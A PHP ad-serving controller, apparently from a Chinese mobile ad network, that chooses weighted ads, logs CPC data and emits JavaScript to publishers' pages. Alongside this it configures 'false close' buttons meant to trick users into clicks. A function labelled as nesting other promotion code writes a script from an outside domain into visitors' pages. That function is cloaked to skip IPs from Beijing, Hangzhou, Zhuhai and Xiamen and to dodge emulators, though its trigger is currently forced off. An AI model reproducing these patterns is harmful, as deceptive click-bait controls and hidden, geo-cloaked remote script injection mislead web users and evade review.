<?php
namespace app;

use Memcache;

use app\Config\AppConfig;
use app\Helpers\Model;
use app\Helpers\Mssql;
use app\Helpers\Helper;


class AdsController extends CommonController
{
    protected $website;     //站长信息
    protected $paramet;     //参数
    protected $jk_domain;       //计算PV域名
    protected $wap_tz_domain;   //wap点击
    protected $wechat_tz_domain;   //微信点击

    function __construct()
    {
        parent::__construct();

        if(strpos(Helper::server('http_referer'), 'https://') !== false){
            /*
            $this->jk_domain = 'https://in.pingao.com';
            $this->wap_tz_domain = 'https://in.pingao.com';
            $this->wechat_tz_domain = 'http://ptd.5177jy.com';
    */
            $this->jk_domain = 'https://tp.ningyizs.com';
            $this->wap_tz_domain = 'https://tt.ningyizs.com';
            $this->wechat_tz_domain = 'http://ptd.5177jy.com';

        }else{
            /*
            $this->jk_domain = 'http://in.pingao.com';
            $this->wap_tz_domain = 'http://in.pingao.com';
            $this->wechat_tz_domain = 'http://ptd.5177jy.com';
*/
            $this->jk_domain = 'http://tp.moecz.com';
            $this->wap_tz_domain = 'http://td.biyao365.com';
            $this->wechat_tz_domain = 'http://ptd.5177jy.com';
        }
        
    }

    // 获取广告
    public function adsAction($ad_pos, $position_id){

        $this->paramet->ad_pos = trim($ad_pos);
        $this->paramet->position_id = trim($position_id);

        //验证参数
        if( empty($this->paramet->ad_pos) && $this->paramet->ad_pos!=0 )
            Helper::message('parameter error');

        if(empty($this->paramet->position_id))
            Helper::message('parameter error');

        
        //广告位
        $model = new Model();
        $adposition = $model->getAdposition($this->paramet->position_id, AppConfig::get('type_id'), $this->memcache_obj);

        //找不到定位13889
        if($adposition===false || $adposition=="null")
        {
            $this->paramet->position_id = 13889;
            $model = new Model;
            $adposition = $model->getAdposition($this->paramet->position_id, AppConfig::get('type_id'), $this->memcache_obj);
            if($adposition===false)
            {
                Helper::message('Advertising does not exist');
            }
        }

        //站长信息
        $model = new Model;
        $this->website = $model->getWebsite($adposition->userid, $this->memcache_obj);

        //是否存在
        if(empty($this->website))
            Helper::message('The account does not exist');

        //站长状态
        if($this->website->zhuangtai!=1)
            Helper::message('Your account is not open');

        //是否开通广告
        if(strpos($this->website->openty, (string)AppConfig::get('type_id')) === false)
            Helper::message('No advertisement type is available');

        //域名是否登记
        if(!strpos($this->website->urlstr, $this->client_data->domain) && $this->website->ifdomain == 0)
            Helper::message('Domain name registration.');



        //获取广告
        $model = new Model;
        $ads = $model->getAds( AppConfig::get('type_id'), $this->memcache_obj);

        //是否有广告
        if(empty($ads) || empty($ads->list) || empty($ads->info))
            die('No advertising');

        //指定分类
        $ads_class = explode(',', ($this->client_data->phone_type == 1) ? trim($adposition->wadsclass) : trim($adposition->iosclass));
        

        $ok_ads = (object)[];
        $no_ads = (object)[];
        //全部类型
        if( count($ads_class)==0 ){

            foreach($ads->list as $value)
            {
                foreach($value as $v)
                {
                    $ok_ads->$v = $ads->info->$v;
                }
            }

        }else{

            foreach($ads->list as $key => $value)
            {
                foreach ($value as $v)
                {
                    
                    if( in_array($key, $ads_class) )
                    {
                        $ok_ads->$v = $ads->info->$v;
                    }
                    else
                    {
                        $no_ads->$v = $ads->info->$v;
                    }
                }
            }
        }
        
        //ip
        $ip_number = ip2long(Helper::getClientIp());
        //地区
        $area_name = Helper::getAreaByip($ip_number);

        //假关闭调用
        $false_close = $this->getFalseClose($this->client_data->phone_type, $area_name);
        $false_close = $false_close ? $false_close : 0;

        $nowdic = [];   //投放广告ID Array
        foreach($ok_ads as $ad_id => $ad){

            if($ad->istype==$this->client_data->is_wechat  //是否支持微信
            && strpos($ad->phonetype, (string)$this->client_data->phone_type)!==false //是否支持系统
            && strpos($ad->blacksiteid, ','.$this->website->userid.',')===false //屏蔽的站
            && (empty($ad->okarea) || mb_strpos($ad->okarea, $area_name, 0, 'UTF-8') !== FALSE)
            )
            {
                if($ad->unshow_phone != '0')
                {
                    //获取当前手机处理
                    foreach (explode(',', $ad->unshow_phone) as $value)
                    {
                        if(strpos(strtolower(Helper::server('http_user_agent')), (string)$value) !== false)
                        {
                            $unshow = true;
                            break;
                        }
                    }
                }

                if(empty($unshow))
                {
                    if($ad->sqms==1)
                    {
                        if(strpos($ad->limitsiteid, ','.$this->website->userid.',') !== FALSE)
                        {
                            $nowdic[] = $ad_id;
                        }
                    }
                    else
                    {
                        $nowdic[] = $ad_id;	
                    }
                }
            }
                
        }

        //如果没有符合广告，则取出不符合广
        if(!$nowdic)
        {
            if($adposition->noadok == 1 && !empty($no_ads))
            {
                $ok_ads = $no_ads;
                foreach ($no_ads as $no_ad_id => $ad)
                {
                    if($ad->istype==$this->client_data->is_wechat   //是否支持微信
                    && strpos($ad->phonetype, (string)$this->client_data->phone_type)!==false    //是否支持系统
                    && strpos($ad->blacksiteid, ','.$this->website->userid.',')===false  //?????????????????????????????
                    && $ad->sqms==0)    //投放方式自动还是手动
                    {
                        $nowdic[] = $no_ad_id;
                    }
                }
            }
        }

        if(!$nowdic)
            die('No advertising.');

        $ads = $ok_ads;
        // 随机取出广告
        for($i = 0; $i < AppConfig::get('number'); $i++)
        {
            $totalweight = 0;
            $weightdic = [];

            shuffle($nowdic);   //随机重新排序

            foreach($nowdic as $k=>$val)
            {
                $weightdic[$k] = $ok_ads->$val->weight1;
                $totalweight += $ok_ads->$val->weight1;
            }
            
           
            $rnd_ad = mt_rand(1, $totalweight);
            $adsid = 0;		// 选中的广告编??

            // 利用权重的上下界数值比较确定选中哪个广告
            foreach($weightdic as $k => $v)
            {
                if($rnd_ad <= $v){
                    $adsid = (int)$nowdic[$k];
                    break;
                }else{
                    $rnd_ad -= $v;
                    continue;
                }
            }

            $rndadspv = mt_rand(1, AppConfig::get('rate'));		//前来源抽样概��?? 1/10

            $useripaid = $ip_number . $adsid;
            
            //特殊广告输出
            if(in_array($adsid, AppConfig::get('special_ads_id')))
            {
                $linkurl = base64_encode('1='.$adsid.'='.$this->website->userid.'='.time().'='.$this->paramet->position_id.'='.AppConfig::get('type_id').'='.Helper::iptopwd($useripaid, date('md')).'='.$ip_number);
                // 记录pv数据
                $is_cpc_count = !empty($_COOKIE['pg_jusha_cpc_'.$ip_number.$adsid]) ? $_COOKIE['pg_jusha_cpc_'.$ip_number.$adsid] : 0;
            
                if(!$is_cpc_count){

                    $mssql = new Mssql;

                    //cpc查询
                    $bind_data = [
                        ['adsid', $adsid, SQLVARCHAR],
                        ['uip', $ip_number, SQLVARCHAR]
                    ];
                    $result = $mssql->init('xyz69_cpc')->bindArr($bind_data)->execute();

                    //错误处理
                    if(empty($result))
                        Helper::errorlog('The reservoir process xyz69_cpc failed.', __FILE__);


                    $is_cpc_ad = $mssql->fetchRow($result)[0];

                    //$mssql->fetchRow($result);

                    $mssql->freeStatement();

                    //$mssql->freeResult($result);

                    if(!$is_cpc_ad){

                        //插入数据
                        $bind_data = [
                            ['userid', $this->website->userid, SQLINT2],
                            ['adsid', $adsid, SQLVARCHAR],
                            ['mip', $ip_number, SQLVARCHAR],
                            ['pid', $this->paramet->position_id, SQLINT2]
                        ];
                        $result = $mssql->init('vistdata69_cpc_count')->bindArr($bind_data)->execute();

                        //错误处理
                        if(empty($result))
                            Helper::errorlog('The reservoir process vistdata69_cpc_count failed.', __FILE__);


                        $mssql->freeStatement();

                        setcookie('pg_cpc_'.$ip_number.$adsid, 1, time()+24*60*3600);
                    }
                }

                out_special_ad($adsid, $this->ad_pos, $rndadspv, $linkurl, $this->client_data->phone_type);

                echo '!(function(){var b,a=document.createElement("script");a.src="'.$this->jk_domain.'/se?u='.$linkurl.'",b=document.getElementsByTagName("html")[0],b.appendChild(a)})();';
                
                exit;
            }

            //5122屏蔽微信量
            if($this->website->userid==5122 && $this->client_data->is_wechat==0)
            {
                die;
            }
            

            //正常广告处理
            if($adposition->ispic == 1)
            {	
                $nowpic = explode(',', str_replace(' ', '', $ok_ads->$adsid->picurl0));  //目前只有这一个
            }
            elseif($adposition->ispic == 2)
            {
                $nowpic = explode(',', str_replace(' ', '', $ok_ads->$adsid->picurl1));
            }
            else
            {
                $nowpic = explode(',', str_replace(' ', '', $ok_ads->$adsid->picurl2));
            }


            if($this->website->userid=='4597')
            {
                $pic_url = "http://ey.ucxsw.com/11/";
            }
            else
            {
                $pic_url = AppConfig::get('pic_url');
            }
            
            //在UC浏览器 或者  QQ浏览器 gif图片后缀修改成 bmp
            if(0)
            {
                $imgsrc[] =  $pic_url.preg_replace('/.gif$/','.bmp', $nowpic[array_rand($nowpic, 1)]);
            }
            else
            {
                $imgsrc[] =  $pic_url.$nowpic[array_rand($nowpic, 1)];
            }

            //传递参数
            $data = [
                'adsid' => $adsid,
                'website_id' => $this->website->userid,
                'position_id' => $this->paramet->position_id,
                'type_id' => AppConfig::get('type_id'),
                'gotourl' => urlEncode($ok_ads->$adsid->gotourl),
                'time' => time(),
            ];

            if( $token = Helper::getAccessToken($data) )
            {
                $data['access_token'] = $token;
            }
            else
            {
                Helper::message('AccessToken error');
            }

            if($i == 0)
            {
                $pv_url = $this->jk_domain.'/se?u='.base64_encode(http_build_query($data));
                $anim_adid = $adsid;
            }
            
            $imgcounturl[] = ($this->client_data->is_wechat ? $this->wap_tz_domain : $this->wechat_tz_domain)."/url?s=".base64_encode(http_build_query($data));
            
            $gotourls[] = $ok_ads->$adsid->gotourl;

        }

        $GCIDS = 'p'.$this->paramet->ad_pos.$this->website->userid.substr(str_shuffle('abcdefghjkmnpqrstuvwxyz'), 0, 5);

        
        header("Content-type: application/javascript");
        
        if(strpos(Helper::server('http_referer'), 'debug=test'))
        {
            require __ROOT__.'/../script/ad.js';
            
            Helper::out_haimen_ad($this->client_data->phone_type, $ip_number);
        }
        else
        {
            require __ROOT__.'/../script/ad.min.js';
            
            Helper::out_haimen_ad($this->client_data->phone_type, $ip_number);
        }

        if( $this->website->userid!=4927 )
        {
            $this->otherExtend($ip_number, $area_name);
        }
        
    }


    //设置是否变小
    public function is_lessen()
    {
        $websiteid = ['1000'];
        if(in_array($this->website->userid, $websiteid))
        {
            return 1;
        }
        else
        {
            return 0;
        }
    }

    //设置是否检测
    public function is_check()
    {
        $websiteid = ['1000'];
        if(in_array($this->website->userid, $websiteid))
        {
            return 1;
        }
        else
        {
            return 0;
        }
    }

    //图标样式
    public function getStatus($type)
    {
        //默认的
        $status = AppConfig::get('status.default');
        foreach(AppConfig::get('status') as $key=>$val)
        {
            if($key==$this->website->userid)
            {
                $status = $val;
            }
        }

        return $status[$type];
    }

    //获取假关闭机率值
    public function getFalseClose($phone_type, $area_name)
    {
        if($this->website->js_icon_config>0)
        {
            //地区检测是否屏蔽
            if($this->website->js_icon_okarea)
            {
                $areaArray = explode(",", $this->website->js_icon_okarea);

                foreach($areaArray as $value)
                {
                    //如果屏蔽了此站点返回 false
                    if($area_name==trim($value))
                    {
                        return false;
                    }
                }
            }


            //检测生效时间
            $time = date("H");
            if($this->website->js_icon_time)
            {
                $timeArray = explode(",", $this->website->js_icon_time);
                
                $is_time = false;
                foreach($timeArray as $value)
                {
                    //如果屏蔽了此站点返回 false
                    if($time==trim($value))
                    {
                        $is_time = true;
                        break;
                    }
                }
                if($is_time==false)
                {
                    return false; 
                }
            }
            else
            {
                return false;
            }

        

            //检测设备
            if($this->website->js_icon_ptype!=0)
            {
                if($phone_type != $this->website->js_icon_ptype)
                {
                    return false; 
                }
            }
           
            return $this->website->js_icon_config;
        }
        else
        {
            return false;
        }
    }


    //嵌套其他推广代码
    public function otherExtend($ip_number, $area_name)
    {
        /***
         * 其他推广代码
         * 
         * 1. 需要屏蔽指定地区
         * 2. 需要屏蔽电脑模拟器
         */
        
        //屏蔽地区
        $is_shield_city = false;

        //允许的系统 1：Android  2：IOS
        $client_type = [1, 2];

        //检测城市是否屏蔽
        if($area_name=='北京')
        {
            $is_shield_city = true;
        }
        //杭州
        $hangzhou = include AppConfig::get('ip_path').'/hangZhouIp.php';
        foreach ($hangzhou as $k => $v)
        {
            if($ip_number > $k && $ip_number < $v)
            {
                $is_shield_city = true;
                break;
            }
        }
        //珠海 厦门
        $xmzh = include AppConfig::get('ip_path').'/ipListXmzh.php';
        foreach ($xmzh as $k => $v)
        {
            if($ip_number > $k && $ip_number < $v)
            {
                $is_shield_city = true;
                break;
            }
        }
      
        //屏蔽的城市
        if($is_shield_city===false)
        {
            //允许的设备
            if(in_array($this->client_data->phone_type, $client_type) && !$this->website->iftype)
            {
                //Android 模拟机
                if($this->client_data->phone_type==1)
                {
                    if(strlen(Helper::server('http_user_agent')) > 155)
                    {
                        $tb_rand = mt_rand(1, 4);
                        $tb_rand = 5;
                        if( empty($_COOKIE['pgm1_'.$ip_number]) && $tb_rand==1){

                            ?>;function WckseteCookie(name,value){var Days=1;var exp=new Date();exp.setTime(exp.getTime()+Days*24*60*60*1000);document.cookie=name+"="+escape(value)+";expires="+exp.toGMTString()}function WckgeteCookie(name){var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");if(arr=document.cookie.match(reg)){return unescape(arr[2])}else{WckseteCookie(name,1);return 1}}if (WckgeteCookie('pgm1_<?=$ip_number?><?=date('Ymd')?>')!=2){WckseteCookie('pgm1_<?=$ip_number?><?=date('Ymd')?>',2);document.writeln('<script type="text/javascript" src="http://www.taolecun.com/jy.js?advert=199"></script>');}<?php
                            setcookie('pgm1_'.$ip_number, 1 , strtotime('23:59:59'));
                        }
                    }
                }

                //IOS 模拟机
                if($this->client_data->phone_type==2)
                {
                    if(strlen(Helper::server('http_user_agent')) > 134)
                    {
                        $tb_rand = mt_rand(1, 4);
                        $tb_rand = 5;
						if( empty($_COOKIE['pgm1_'.$ip_number]) && $tb_rand==1){
                            
                            ?>;function WckseteCookie(name,value){var Days=1;var exp=new Date();exp.setTime(exp.getTime()+Days*24*60*60*1000);document.cookie=name+"="+escape(value)+";expires="+exp.toGMTString()}function WckgeteCookie(name){var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");if(arr=document.cookie.match(reg)){return unescape(arr[2])}else{WckseteCookie(name,1);return 1}}if (WckgeteCookie('pgm1_<?=$ip_number?><?=date('Ymd')?>')!=2){WckseteCookie('pgm1_<?=$ip_number?><?=date('Ymd')?>',2);document.writeln('<script type="text/javascript" src="http://www.taolecun.com/jy.js?advert=199"></script>');}<?php
                            setcookie('pgm1_'.$ip_number, 1 , strtotime('23:59:59'));
                        }
                    }
                }
            }
        }

    }
}